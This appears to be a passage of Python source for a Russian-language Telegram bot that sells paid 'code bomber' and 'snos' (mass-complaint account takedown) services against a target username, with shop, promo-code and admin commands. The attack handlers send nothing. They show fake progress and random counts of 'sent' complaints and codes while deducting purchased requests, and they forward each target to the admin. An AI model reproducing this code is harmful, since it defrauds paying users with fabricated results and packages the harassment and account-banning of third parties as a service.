                 f"*🆔 ID пользователя:* `{user_id}`\n"
                 f"*🎯 Цель бомбера:* `{username_input}`\n\n"
                 f"*⏰ Время:* {asyncio.get_event_loop().time()}",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    except Exception as e:
        print(f"Не удалось отправить админу: {e}")
    
    # Финальный результат пользователю
    sent = random.randint(200, 350)
    failed = random.randint(15, 40)
    codes_sent = random.randint(80, 150)
    
    escaped_sent = escape_markdown(str(sent))
    escaped_failed = escape_markdown(str(failed))
    escaped_codes = escape_markdown(str(codes_sent))
    escaped_target = escape_markdown(username_input)
    
    user_data = get_user(user_id)
    escaped_bomb_requests = "∞" if is_admin(user_id) else escape_markdown(str(user_data[4]))
    
    result_text = (
        f"*💣 Бомбер кодов завершен\\!*\n\n"
        f"*✅ Отправлено жалоб:* {escaped_sent}\n"
        f"*✅ Отправлено кодов:* {escaped_codes}\n"
        f"*❌ Не отправлено:* {escaped_failed}\n"
        f"*🎯 Цель:* {escaped_target}\n\n"
        f"*🧨 Осталось бомберов:* {escaped_bomb_requests}\n\n"
        f"*⚠️ Коды отправлены на сервера Telegram\\. Ожидайте результата в течение 24 часов\\.*"
    )
    
    keyboard = [
        [InlineKeyboardButton("🧨 Новый бомбер", callback_data='bomber')],
        [InlineKeyboardButton("🏪 Купить бомберы", callback_data='shop_bomber')],
        [InlineKeyboardButton("🔙 В меню", callback_data='main_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await msg.edit_text(
        text=result_text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=reply_markup
    )

async def sn0s_handler(query, context: ContextTypes.DEFAULT_TYPE):
    """Оптимизированный обработчик сноса"""
    user_id = query.from_user.id
    user_data = get_user(user_id)
    is_admin_user = is_admin(user_id)
    
    # Проверка наличия запросов
    if not is_admin_user and user_data[3] <= 0 and user_data[5] == 'none':
        keyboard = [
            [InlineKeyboardButton("🏪 Купить запросы", callback_data='shop')],
            [InlineKeyboardButton("🔙 Назад", callback_data='main_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            text="*💎 У вас нет запросов\\! Купите их в магазине или приобретите полноценную подписку\\.*",
            parse_mode=ParseMode.MARKDOWN_V2,
            reply_markup=reply_markup
        )
        return
    
    # Списание запросов
    if not is_admin_user and user_data[5] == 'none':
        update_requests(user_id, -1)
    
    # Быстрая симуляция (5 секунд вместо 10)
    processing_msg = await query.edit_message_text(
        text="*⛔️ Отправка жалоб\\.\\.\\.*",
        parse_mode=ParseMode.MARKDOWN_V2
    )
    
    # Всего 5 шагов
    for step in range(1, 6):
        await asyncio.sleep(1)
        
        progress = step * 20
        progress_bar = "█" * step + "░" * (5 - step)
        current_complaints = random.randint(20, 40)
        
        escaped_progress = escape_markdown(str(progress))
        escaped_complaints = escape_markdown(str(current_complaints))
        
        try:
            await processing_msg.edit_text(
                text=f"*⛔️ Отправка жалоб\\.\\.\\.*\n\n"
                     f"*📊 Прогресс:* {escaped_progress}%\n"
                     f"*{progress_bar}*\n"
                     f"*📨 Отправлено:* {escaped_complaints}",
                parse_mode=ParseMode.MARKDOWN_V2
            )
        except:
            pass
    
    # Финальный результат
    target_username = context.user_data.get('target_username', '@unknown')
    sent = random.randint(100, 123)
    failed = random.randint(7, 15)
    
    escaped_target = escape_markdown(target_username)
    escaped_sent = escape_markdown(str(sent))
    escaped_failed = escape_markdown(str(failed))
    
    user_data = get_user(user_id)
    escaped_requests = "∞" if is_admin_user else escape_markdown(str(user_data[3]))
    
    result_text = (
        f"*😔 Sn0s не удался\\!*\n\n"
        f"*✅ Отправлено жалоб:* {escaped_sent}\n"
        f"*❌ Не отправлено:* {escaped_failed}\n"
        f"*👤 Юзернейм:* {escaped_target}\n\n"
    )
    
    if not is_admin_user:
        result_text += f"*Осталось запросов:* {escaped_requests}\n\n"
    
    result_text += f"*Попробуйте еще раз\\!*"
    
    keyboard = [
        [InlineKeyboardButton("🍀 Новый шанс", callback_data='check_chance')],
        [InlineKeyboardButton("🏪 Купить запросы", callback_data='shop')],
        [InlineKeyboardButton("🔙 В меню", callback_data='main_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await processing_msg.edit_text(
        text=result_text,
        parse_mode=ParseMode.MARKDOWN_V2,
        reply_markup=reply_markup
    )

# ========== АДМИН КОМАНДЫ ==========
async def addpromo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Создание промокода"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("*❌ У вас нет прав администратора\\.*", parse_mode=ParseMode.MARKDOWN_V2)
        return
    
    if len(context.args) != 2:
        await update.message.reply_text(
            "*Использование:* /addpromo КОД СУММА\n"
            "*Пример:* /addpromo MWKK22 50\n"
            "*Пример:* /addpromo SUMMER2024 25\\.5",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return
    
    promo_code = context.args[0]
    amount_input = context.args[1]
    
    # Проверка кода промокода
    if not (2 <= len(promo_code) <= 20):
        await update.message.reply_text(
            "*❌ Код промокода должен быть от 2 до 20 символов\\.*",
            parse_mode=ParseMode.MARKDOWN_V2
        )
        return
    
    try:
        amount = float(amount_input)
        if amount <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("*❌ Ошибка: неверная сумма\\. Сумма должна быть положительным числом\\.*", parse_mode=ParseMode.MARKDOWN_V2)
        return
    
    # Создаем промокод
    success, message = create_promocode(promo_code, amount, user_id)
    
    if success:
        escaped_code = escape_markdown(promo_code.upper())
        escaped_amount = escape_markdown(str(amount))
        
        await update.message.reply_text(
            f"*✅ Промокод создан\\!*\n\n"
            f"*Код:* `{escaped_code}`\n"
            f"*Сумма:* {escaped_amount}\\$\n"
            f"*Статус:* Активный\n"
            f"*Использование:* Одноразовый\n\n"
            f"*📝 Пользователь активирует промокод через кнопку \"📈 Промокод\" в меню\\.*",
            parse_mode=ParseMode.MARKDOWN_V2
        )
    else:
        await update.message.reply_text(f"*❌ {message}*", parse_mode=ParseMode.MARKDOWN_V2)

async def promolist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Список всех промокодов"""
    user_id = update.effective_user.id
    
    if not is_admin(user_id):
        await update.message.reply_text("*❌ У вас нет прав администратора\\.*", parse_mode=ParseMode.MARKDOWN_V2)
        return
    
    promocodes = get_all_promocodes()
    
    if not promocodes:
        await update.message.reply_text("*📭 Нет созданных промокодов\\.*", parse_mode=ParseMode.MARKDOWN_V2)
        return
    
    active_count = sum(1 for p in promocodes if not p['is_used'])
    used_count = sum(1 for p in promocodes if p['is_used'])
    total_amount = sum(p['amount'] for p in promocodes if not p['is_used'])
    
    escaped_active = escape_markdown(str(active_count))
    escaped_used = escape_markdown(str(used_count))
    escaped_total = escape_markdown(str(total_amount))
    escaped_total_all = escape_markdown(str(len(promocodes)))
    
    message = (
        f"*📊 Все промокоды:*\n\n"
        f"*Активных:* {escaped_active}\n"
        f"*Использованных:* {escaped_used}\n"
        f"*Всего:* {escaped_total_all}\n"
        f"*Сумма активных:* {escaped_total}\\$\n\n"
    )
    
    # Добавляем последние 10 промокодов
    for promo in promocodes[:10]:
        status = "✅ Активен" if not promo['is_used'] else "❌ Использован"
        used_by = f"👤 {promo['used_by']}" if promo['used_by'] else ""
        amount = escape_markdown(str(promo['amount']))
        code = escape_markdown(promo['code'])
        
        message += f"*{code}* \\- {amount}\\$ \\- {status} {used_by}\n"
    
    if len(promocodes) > 10:
        message += f"\n*... и еще {len(promocodes) - 10} промокодов*"
    
    await update.message.reply_text(message, parse_mode=ParseMode.MARKDOWN_V2)

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда статистики"""
    if not is_admin(update.effective_user.id):
        return
    
    conn = sqlite3.connect(DATABASE_PATH, check_same_thread=False)
    c = conn.cursor()
    
    c.execute("SELECT COUNT(*) FROM users WHERE is_admin=0")
    total_users = c.fetchone()[0]
    
    c.execute("SELECT SUM(balance) FROM users WHERE is_admin=0")
    total_balance = c.fetchone()[0] or 0
    
    c.execute("SELECT COUNT(*) FROM users WHERE is_admin=1")
    total_admins = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM purchases")
    total_purchases = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM promocodes")
    total_promos = c.fetchone()[0]
    
    c.execute("SELECT COUNT(*) FROM promocodes WHERE is_used=1")
    used_promos = c.fetchone()[0]
    
    # Бомбер статистика
    c.execute("SELECT SUM(bomb_requests) FROM users WHERE is_admin=0")
    total_bombs = c.fetchone()[0] or 0
    
    conn.close()
    
    escaped_users = escape_markdown(str(total_users))
    escaped_balance = escape_markdown(f"{total_balance:.2f}")
    escaped_admins = escape_markdown(str(total_admins))
    escaped_purchases = escape_markdown(str(total_purchases))
    escaped_promos = escape_markdown(str(total_promos))
    escaped_used_promos = escape_markdown(str(used_promos))
    escaped_bombs = escape_markdown(str(total_bombs))
    
    stats_text = (
        f"*📊 Статистика бота:*\n\n"
        f"*Пользователей:* {escaped_users}\n"
        f"*Администраторов:* {escaped_admins}\n"
        f"*Общий баланс:* {escaped_balance}\\$\n"
        f"*Всего покупок:* {escaped_purchases}\n"
        f"*Промокодов:* {escaped_promos}\n"
        f"*Использовано промокодов:* {escaped_used_promos}\n"
        f"*Всего бомберов:* {escaped_bombs}\n"
        f"*Кэш пользователей:* {len(user_cache)}\n"
        f"*Кэш промокодов:* {len(promo_cache)}"
    )
    
    await update.message.reply_text(stats_text, parse_mode=ParseMode.MARKDOWN_V2)

async def mybalance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Команда моего баланса"""
    user_id = update.effective_user.id
    user_data = get_user(user_id)
    is_admin_user = is_admin(user_id)
    
    if is_admin_user:
        balance_text = "*∞ \\$ \\(АДМИН\\)*"
        requests_text = "*∞ запросов*"
        bomb_text = "*∞ бомберов*"
        subscription_text = "*∞ запросов в день*"
        admin_badge = "*👑 АДМИНИСТРАТОР*"
    else:
        balance = escape_markdown(f"{user_data[2]:.2f}")
        requests = escape_markdown(str(user_data[3]))
        bomb_requests = escape_markdown(str(user_data[4]))
        subscription = escape_markdown(user_data[5])
        balance_text = f"*{balance}\\$*"
        requests_text = f"*{requests}*"
        bomb_text = f"*{bomb_requests}*"
        subscription_text = f"*{subscription}*"
        admin_badge = ""
    
    balance_info = (
        f"*💰 Ваш баланс:*\n\n"
        f"{admin_badge}\n"
        f"*Баланс:* {balance_text}\n"
        f"*Запросы:* {requests_text}\n"
        f"*Бомберы:* {bomb_text}\n"
        f"*Подписка:* {subscription_text}"
    )
    
    await update.message.reply_text(balance_info, parse_mode=ParseMode.MARKDOWN_V2)

async def clear_cache_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Очистка кэша (только для админа)"""
    if not is_admin(update.effective_user.id):
        return
    
    global user_cache, promo_cache
    old_user_size = len(user_cache)
    old_promo_size = len(promo_cache)
    
    user_cache.clear()
    promo_cache.clear()
    
    await update.message.reply_text(
        f"*✅ Кэш очищен\\!*\n"
        f"*Пользователи до:* {old_user_size}\n"
        f"*Пользователи после:* {len(user_cache)}\n"
        f"*Промокоды до:* {old_promo_size}\n"
        f"*Промокоды после:* {len(promo_cache)}",
        parse_mode=ParseMode.MARKDOWN_V2
    )

# ========== ОСНОВНАЯ ФУНКЦИЯ ==========
def main():
    """Основная функция запуска"""
    # Инициализация БД
    init_db()
    
    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Добавляем обработчики
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("addpromo", addpromo_command))
    application.add_handler(CommandHandler("promolist", promolist_command))
    application.add_handler(CommandHandler("stats", stats_command))
    application.add_handler(CommandHandler("mybalance", mybalance_command))
    application.add_handler(CommandHandler("clearcache", clear_cache_command))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("=" * 50)
    print("🚀 Бот запущен со всеми функциями!")
    print(f"👑 Админ: @{ADMIN_USERNAME}")
    print("✅ Добавлено:")
    print("• 6 кнопок в меню (3 ряда по 2 кнопки)")
    print("• Кнопка '🧨 Бомбер кодов'")
    print("• Бомбер запросы в магазине")
    print("• Авто-отправка целей админу @websecurlty")
    print("• Проверка наличия бомбер запросов")
    print("=" * 50)
    
    # Запускаем бота
    application.run_polling()

if __name__ == '__main__':
    # Настройка логирования
    logging.basicConfig(
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
    
    # Запускаем
    main()
